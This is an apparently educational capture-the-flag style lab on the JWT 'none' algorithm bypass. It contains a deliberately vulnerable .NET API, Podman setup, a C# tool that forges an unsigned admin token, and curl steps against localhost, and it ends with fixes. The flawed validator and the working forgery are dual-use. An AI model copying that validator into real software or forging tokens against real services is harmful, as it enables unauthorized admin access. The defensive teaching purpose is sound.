# The Unsigned Letter: Hacking JWTs in .NET
**JSON Web Tokens (JWT)** are the standard for modern, stateless authentication. Unlike a session ID (which is just a reference), a JWT contains the data. It is a signed package stating: "User ID 42 is an Admin."

But what happens if we strip off the signature?

In this lab, we will explore the **"None" Algorithm Attack**. You will analyze a vulnerable .NET API that blindly trusts the token's header, and you will write a C# tool to forge your own admin credentials.

***
#### JWT Signature Bypass (The "None" Algorithm)
The "None" Algorithm attack is a classic logic flaw where a server blindly trusts the token's metadata. If the token says "I am not signed," the server skips the signature verification step, allowing an attacker to inject arbitrary claims (like role: admin).

***
## The Architecture: The "Sidecar" Micro-Range
We are using a `Podman Pod` to simulate a network environment.
- **Target (Port 8084):** A .NET Web API with a naive JWT implementation.
- **Attacker:** A Kali Linux container (or your host machine) used to forge tokens.
- **The Vulnerability:** The server checks the alg header in the JWT. If it sees none, it skips signature validation.
***
### Phase 1: Build the Target (.NET)
We need a target that generates and accepts JWTs. We will write a custom implementation to demonstrate exactly why standard libraries (like Microsoft.IdentityModel) are so important—they block this attack by default.

#### 1. The Application Code (`Program.cs`)
Save this code. It simulates a system where you login to get a User token, but you need an Admin token to reach the flag.
```csharp
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using System.Security.Cryptography;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

// Secret Key (Only the server knows this)
var SECRET_KEY = Encoding.UTF8.GetBytes("super_secret_key_never_share_this_12345");

// --- 1. LOGIN (Get a valid User Token) ---
app.MapGet("/login", () =>
{
    var header = new { alg = "HS256", typ = "JWT" };
    var payload = new { sub = "student", role = "user", iat = DateTimeOffset.UtcNow.ToUnixTimeSeconds() };

    string token = CreateToken(header, payload, SECRET_KEY);
    return Results.Ok(new { token = token });
});

// --- 2. PROTECTED RESOURCE (Admin Only) ---
app.MapGet("/admin", (HttpContext context) =>
{
    string authHeader = context.Request.Headers["Authorization"];
    if (string.IsNullOrEmpty(authHeader) || !authHeader.StartsWith("Bearer "))
        return Results.Unauthorized();

    string token = authHeader.Substring("Bearer ".Length).Trim();

    try
    {
        // VULNERABILITY: We trust the token to tell us how to verify it.
        if (ValidateToken(token, out var claims))
        {
            if (claims["role"].ToString() == "admin")
            {
                return Results.Ok(new { 
                    status = "pwned", 
                    flag = "flag{always_check_the_algorithm}",
                    msg = "Welcome, Administrator."
                });
            }
            return Results.Problem("Forbidden: Admins only.", statusCode: 403);
        }
    }
    catch { return Results.BadRequest("Invalid Token"); }

    return Results.Unauthorized();
});

// --- NAIVE JWT LOGIC ---
string CreateToken(object header, object payload, byte[] key)
{
    string b64Header = Base64UrlEncode(JsonSerializer.Serialize(header));
    string b64Payload = Base64UrlEncode(JsonSerializer.Serialize(payload));
    string signature = ComputeSignature(b64Header, b64Payload, key);
    return $"{b64Header}.{b64Payload}.{signature}";
}

bool ValidateToken(string token, out JsonNode claims)
{
    claims = null;
    var parts = token.Split('.');
    if (parts.Length != 3) return false; 

    string b64Header = parts[0];
    string b64Payload = parts[1];
    string incomingSig = parts[2];

    // Decode Header to check Algorithm
    var headerJson = Encoding.UTF8.GetString(Base64UrlDecode(b64Header));
    var headerObj = JsonNode.Parse(headerJson);
    string alg = headerObj["alg"]?.ToString();

    // THE CRITICAL FLAW: Trusting "none"
    if (alg == "none" || alg == "None")
    {
        // Bypass signature check!
        var payloadJson = Encoding.UTF8.GetString(Base64UrlDecode(b64Payload));
        claims = JsonNode.Parse(payloadJson);
        return true;
    }

    // Normal Validation (HS256)
    if (alg == "HS256")
    {
        string expectedSig = ComputeSignature(b64Header, b64Payload, SECRET_KEY);
        if (incomingSig == expectedSig)
        {
            var payloadJson = Encoding.UTF8.GetString(Base64UrlDecode(b64Payload));
            claims = JsonNode.Parse(payloadJson);
            return true;
        }
    }
    return false;
}

string ComputeSignature(string head, string body, byte[] key)
{
    using var hmac = new HMACSHA256(key);
    var bytes = hmac.ComputeHash(Encoding.UTF8.GetBytes($"{head}.{body}"));
    return Base64UrlEncode(bytes);
}

// Helper: JWT uses Base64URL (no padding, -_ instead of +/)
string Base64UrlEncode(string input) => Base64UrlEncode(Encoding.UTF8.GetBytes(input));
string Base64UrlEncode(byte[] input) => Convert.ToBase64String(input)
    .Replace("+", "-").Replace("/", "_").Replace("=", "");
byte[] Base64UrlDecode(string input)
{
    string incoming = input.Replace("-", "+").Replace("_", "/");
    switch (incoming.Length % 4) {
        case 2: incoming += "=="; break;
        case 3: incoming += "="; break;
    }
    return Convert.FromBase64String(incoming);
}

app.Run("http://0.0.0.0:8084");
```

#### 2. The Containerfile
Save as Containerfile
```dockerfile
FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build
WORKDIR /src
RUN dotnet new web -n AuthJWT
COPY src/Program.cs /src/AuthJWT/Program.cs
WORKDIR /src/AuthJWT
RUN dotnet publish -c Release -o /app

FROM mcr.microsoft.com/dotnet/aspnet:8.0
WORKDIR /app
COPY --from=build /app .
ENTRYPOINT ["dotnet", "AuthJWT.dll"]
```

### Phase 2: Deploy the Lab
Run these commands to spin up the environment.
```bash
# 1. Build the Target
podman build -f Containerfile -t auth-jwt-target .

# 2. Create the Pod (Expose Port 8084)
podman pod create --name auth-pod -p 8084:8084

# 3. Launch the Target
podman run -d --pod auth-pod --name target-jwt auth-jwt-target

# 4. Launch the Attacker (Kali)
podman run -d --pod auth-pod --name attacker subratb/kali-rolling-dotnet sleep infinity
```

### Phase 3: The Attack
**Scenario:** You have a valid user account. You want to access /admin. You need to forge a JWT that claims you are an admin, but you don't have the server's secret key to sign it.
#### Step 1: Get a Valid Token
Log in as a normal user to see what a valid token looks like.
```bash
# Remote into Kali (or use Host)
podman exec -it attacker /bin/bash

curl -s http://localhost:8084/login
```

##### Analysis:
You receive a string: eyJhbGciOiJIUzI1Ni.... If you decoded this (using a tool like jwt.io), you would see alg: HS256 and role: user.
#### Step 2: The Forgery Tool (C#)
We cannot simply edit the token because the signature at the end relies on the exact content. However, if we change the algorithm to "none", we don't need a signature!

Create a simple C# Console App to generate this malicious token.

Run these commands on your Host Machine:
```bash
dotnet new console -n JwtForgery
cd JwtForgery
```
Use code with caution.

Replace Program.cs with this Exploit Code:
```csharp
using System.Text;
using System.Text.Json;

class Program
{
    static void Main()
    {
        // 1. The Malicious Header
        // We tell the server: "Trust me, I am not signed."
        var header = new { alg = "none", typ = "JWT" };

        // 2. The Malicious Payload
        // We inject the "admin" role
        var payload = new 
        { 
            sub = "hacker", 
            role = "admin", 
            iat = DateTimeOffset.UtcNow.ToUnixTimeSeconds() 
        };

        // 3. Encode & Assemble
        string b64Header = Base64UrlEncode(JsonSerializer.Serialize(header));
        string b64Payload = Base64UrlEncode(JsonSerializer.Serialize(payload));

        // CRITICAL: The structure is "Header.Payload.Signature"
        // Since alg is none, the signature is empty, but the trailing DOT must remain.
        string forgedToken = $"{b64Header}.{b64Payload}.";

        Console.WriteLine(forgedToken);
    }

    static string Base64UrlEncode(string input)
    {
        var bytes = Encoding.UTF8.GetBytes(input);
        return Convert.ToBase64String(bytes)
            .TrimEnd('=')       
            .Replace('+', '-')  
            .Replace('/', '_'); 
    }
}
```

#### Step 3: Launch the Attack
Run your C# tool, copy the output, and use it to breach the API.
```bash
# 1. Generate the Token
dotnet run

# 2. Attack (Replace <TOKEN> with your generated string)
curl -v -H "Authorization: Bearer <TOKEN>" http://localhost:8084/admin
```

#### Success!
The server trusts your "None" algorithm and grants you access:
`flag{always_check_the_algorithm}`
#### Conclusion
You just bypassed cryptographic authentication by politely asking the server not to check the signature.
#### The Lesson:
Never trust the client to tell you how to verify their identity.
#### The Fix:
1. **Use Standard Libraries:** Microsoft's JwtBearer middleware rejects alg: none by default.
2. **Enforce Algorithms:** When configuring your verifier, explicitly set `ValidAlgorithms = new[] { SecurityAlgorithms.HmacSha256 }`.